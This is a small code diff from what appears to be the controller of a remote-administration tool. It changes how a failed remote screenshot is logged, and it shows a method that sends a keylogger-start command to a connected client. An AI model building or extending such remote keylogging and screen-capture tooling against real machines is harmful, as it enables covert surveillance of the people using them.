@@ -171,7 +171,7 @@ class Control:
 
             self.logger.info(f"Total bytes received: {os.path.getsize(file)} bytes")
         elif rsp["key"] == ERROR:
-            self.logger.info(f"Error taking screenshot: {rsp['value']}")
+            self.logger.error(f"Failed to take screenshot")
 
     def keylogger_start(self):
         self.socket.send_json(CLIENT_KEYLOG_START)
